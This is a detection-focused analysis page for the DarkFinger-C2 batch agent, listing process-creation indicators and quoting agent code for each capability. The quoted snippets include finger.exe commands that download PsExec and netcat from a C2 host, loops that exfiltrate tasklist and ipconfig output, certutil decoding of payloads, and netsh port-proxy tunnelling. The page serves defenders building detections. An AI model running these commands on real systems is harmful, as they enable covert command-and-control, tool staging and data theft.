# DarkFinger-C2

## Table of Contents

- [DarkFinger-C2](#darkfinger-c2)
  - [Table of Contents](#table-of-contents)
  - [Metadata](#metadata)
  - [Description](#description)
  - [Documentation](#documentation)
  - [Indicators](#indicators)
  - [Capabilities](#capabilities)
    - [Download PsExec64](#download-psexec64)
    - [Download Nc64](#download-nc64)
    - [Exfil Tasklist](#exfil-tasklist)
    - [Exfil IP Config](#exfil-ip-config)
    - [Remove Netsh PortProxy](#remove-netsh-portproxy)
    - [Change C2 Server Port](#change-c2-server-port)
    - [Show Current Portproxy](#show-current-portproxy)
    - [Delete Portproxy and exit](#delete-portproxy-and-exit)
  - [Functionalities](#functionalities)
    - [CheckAdminPriv](#checkadminpriv)
    - [CheckOutbound79](#checkoutbound79)
    - [CleanFile](#cleanfile)
    - [RemoveTmpFile](#removetmpfile)
    - [B64Exe](#b64exe)
    - [AddNetshPortProxy](#addnetshportproxy)

## Metadata

- Evaluator(s): [Nasreddine Bencherchali (@nas_bench)](https://twitter.com/nas_bench)
- Date: 26/01/2022
- Modified: 26/01/2022
- Source: [DarkFinger-C2](https://github.com/hyp3rlinx/DarkFinger-C2/)
- Implementation: Batch

## Description

> Windows TCPIP Finger Command / C2 Channel and Bypassing Security Software

## Documentation

- [Windows TCPIP Finger Command - C2 Channel and Bypassing Security Software](http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt)
- [Understanding & Detecting C2 Frameworks — DarkFinger-C2](https://nasbench.medium.com/understanding-detecting-c2-frameworks-darkfinger-c2-539c79282a1c)

## Indicators

| Description        | Indicator                                                                                                          | Reference                          |
|--------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------|
|  Process Creation  | ```finger ps10@[DarkFinger-C2IP]``` | [Download PsExec64](#download-psexec64) |
|  Process Creation  | ```finger nc10@[DarkFinger-C2IP]``` | [Download Nc64](#download-nc64) |
|  Process Creation  | ```cmd.exe /c tasklist``` | [Exfil Tasklist](#exfil-tasklist) |
|  Process Creation  | ```cmd.exe /c ipconfig /all``` | [Exfil IP Config](#exfil-ip-config) |
|  Process Creation  | ```finger.exe ."[STRING]"@[DarkFinger-C2IP]``` | [Exfil Tasklist](#exfil-tasklist)<br />[Exfil IP Config](#exfil-ip-config) |
|  Process Creation  | ```reg.exe DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F``` | [Remove Netsh PortProxy](#remove-netsh-portproxy) |
|  Process Creation  | ```finger !%TMP_PORT%!@[DarkFinger-C2IP]``` | [Change C2 Server Port](#change-c2-server-port) |
|  Process Creation  | ```netsh interface portproxy show all``` | [Show Current PortProxy](#show-current-portproxy) |
|  Process Creation  | ```net session``` | [Check Admin Priv](#checkadminpriv) |
|  Process Creation  | ```powershell "\$c=New-Object System.Net.Sockets.TCPClient;try{\$c.Connect('%DARK_IP%','%DARK_PORT%')}catch{};if(-Not \$c.Connected){echo \`n'[-] Port 79 unreachable :('}else{$c.Close();echo \`n'[-] Port 79 reachable :)'}"``` | [Check Outbound 79](#checkoutbound79) |
|  Process Creation  | ```cmd.exe /c more +2 tmp.txt``` | [Clean File](#cleanfile) |
|  Process Creation  | ```cmd.exe /c del C:\Users\%username%\Desktop\tmp.txt``` | [Remove Temp File](#removetmpfile) |
|  Process Creation  | ```cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%``` | [Add Netsh PortProxy](#addnetshportproxy) |
|  Process Creation  | ```cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%``` | [Add Netsh PortProxy](#addnetshportproxy) |
|  Process Creation  | ```cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%``` | [Add Netsh PortProxy](#addnetshportproxy) |
|  Process Creation  | ```cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%``` | [Add Netsh PortProxy](#addnetshportproxy) |
|  Process Creation  | ```cmd.exe /c ipconfig\|find "IPv4"``` | |
|  Process Creation  | ```certutil -decode C:\Users\%username%\Desktop\%Tool%.txt C:\Users\%username%\Desktop\%Tool%.EXE``` | [Base64 EXE](#b64exe) |
|  Process Creation  | ```cmd.exe /c del C:\Users\%username%\Desktop\%Tool%.txt``` | [Base64 EXE](#b64exe) |
|  File Creation  | ```C:\Users\%username%\Desktop\tmp.txt``` | |
|  File Creation  | ```C:\Users\%username%\Desktop\PS.txt``` | |
|  File Creation  | ```C:\Users\%username%\Desktop\NC.txt``` | |

## Capabilities

### Download PsExec64

- Description: Downloads PsExec64.exe and saves it to the Desktop as PS.EXE
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L116
- Indicators:
  - Call the `finger` binary with the `ps` keyword at the start (Default delay time is `10`)

    ```batch
    finger ps10@[DarkFinger-C2IP] > tmp.txt
    ```

### Download Nc64

- Description: Downloads Nc64.exe and saves it to the Desktop as NC.EXE
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L129
- Indicators:
  - Call the `finger` binary with the `nc` keyword at the start (Default delay time is `10`)

    ```batch
    finger nc10@[DarkFinger-C2IP] > tmp.txt
    ```

### Exfil Tasklist

- Description: Exfiltrate results of the `tasklist` using the finger utility
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L157
- Indicators:
  - Call to `tasklist` and `finger` binaries via `cmd.exe` with the `/c` flag

    ```batch
    cmd /c for /f "tokens=1" %%i in ('tasklist') do finger ."%%i"@[DarkFinger-C2IP]
    ```

### Exfil IP Config

- Description: Exfiltrate results of the `ipconfig` using the finger utility
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L167
- Indicators:
  - Call to `ipconfig /all` binary via `cmd.exe` with the `/c` flag

    ```batch
    cmd /c for /f "tokens=*" %%a in ('ipconfig /all') do  finger ".%%a"@[DarkFinger-C2IP]
    ```

### Remove Netsh PortProxy

- Description: Removes NETSH PortProxy from the registry
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L203
- Indicators:
  - Call to `reg.exe`

    ```batch
    REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F  >nul 2>&1
    ```

### Change C2 Server Port

- Description: Allows agent to change the DarkFinger C2 listener port.
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L223
- Indicators:
  - Call the `finger` binary with the `!` prefix. (`%TMP_PORT%` could be any port in the allowed range)

    ```batch
    finger !%TMP_PORT%!@[DarkFinger-C2IP]
    ```

### Show Current Portproxy

- Description: Show current PortProxy configuration
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L218
- Indicators:
  - Call to `netsh.exe`

    ```batch
    netsh interface portproxy show all
    ```

### Delete Portproxy and exit

- Description: Removes any previous Portproxy configuration from the registry and exits
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L68
- Indicators:
  - Same indicators as [Remove Netsh PortProxy](#remove-netsh-portproxy)

## Functionalities

### CheckAdminPriv

- Description: Checks if the script is running with admin privileges
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L42
- Indicators:
  - The check is done by executing `net session >nul 2>&1` and checking for the `%ERRORLEVEL%` env variable

    ```batch
    net session >nul 2>&1
    IF %errorLevel% == 0 (
        ECHO [+] Got Admin privileges!.
        SET  /a Admin = 0
        GOTO Init
    ) ELSE  (
        ECHO [!] Agent running as non-admin, if you can escalate privs re-run the agent!.
        SET /a Admin = 1
        SET  DARK_PORT=79
        GOTO CheckOutbound79
    )
    ```

### CheckOutbound79

- Description: Check if port 79 is receahble from the host
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L68
- Indicators:
  - Call to a PowerShell script using sockets to check if the C2 is reachable on port 79

    ```batch
    SET /P DARK_IP="[+] DarkFinger C2 Host/IP: "
    cmd /c powershell "$c=New-Object System.Net.Sockets.TCPClient;try{$c.Connect('%DARK_IP%','%DARK_PORT%')}catch{};if(-Not $c.Connected){echo `n'[-] Port 79 unreachable :('}else{$c.Close();echo `n'[-] Port 79 reachable :)'}"
        ECHO.
    ```

### CleanFile

- Description: Removed the first two lines of `tmp.txt` (Used to download PsExec64.exe and Nc64.exe) as it contains the computer name
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L142
- Indicators:
  - Call to `cmd` with the `/c` flag. (`%Tool%` could either refer to `PS` or `NC`)

    ```batch
    REM remove first two lines of tmp.txt as contains Computer name.
    :CleanFile
    call cmd /c more +2 tmp.txt > %Tool%.txt
    .....
    ```

### RemoveTmpFile

- Description: Deletes `tmp.txt`
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L146
- Indicators:
  - Call to `cmd` with the `/c` flag.

    ```batch
    call cmd /c del C:\Users\%username%\Desktop\tmp.txt
    ```

### B64Exe

- Description: Reconstruct executable from the Base64 text-file using `certutil`
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L151
- Indicators:
  - Call to `certutil` binary with the `-decode` flag
  - Deletes `%Tool%.txt` by calling the `del` command. (`%Tool%` could either refer to `PS` or `NC`)

    ```batch
    call certutil -decode C:\Users\%username%\Desktop\%Tool%.txt C:\Users\%username%\Desktop\%Tool%.EXE 1> nul
    @ECHO.
    call cmd /c del C:\Users\%username%\Desktop\%Tool%.txt
    ```

### AddNetshPortProxy

- Description: Add PortProxy configuration to the registry
- Source Reference:
  - https://github.com/hyp3rlinx/DarkFinger-C2/blob/master/DarkFinger-C2-Agent.bat#L185
- Indicators:
  - Call to `reg.exe` and `netsh.exe`. (`%DARK_IP%` refers the C2_IP and `%DARK_PORT%` refers to C2_PORT)

    ```batch
    ECHO [!] Removing any previous Portproxy from registry.
    REG DELETE HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4 /F  >nul 2>&1
    SET LOCAL_FINGER_PORT=79
    IF %DARK_PORT%==79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%
    IF %DARK_PORT%==79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%
    IF NOT %DARK_PORT% == 79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%LOCAL_FINGER_PORT% connectaddress=%DARK_IP% connectport=%DARK_PORT%
    IF NOT %DARK_PORT% == 79 call cmd /c netsh interface portproxy add v4tov4 listenaddress=%LOCAL_IP% listenport=%DARK_PORT% connectaddress=%LOCAL_IP% connectport=%LOCAL_FINGER_PORT%
    IF %Admin% == 0 netsh interface portproxy show all
    GOTO CmdOpt
    ```
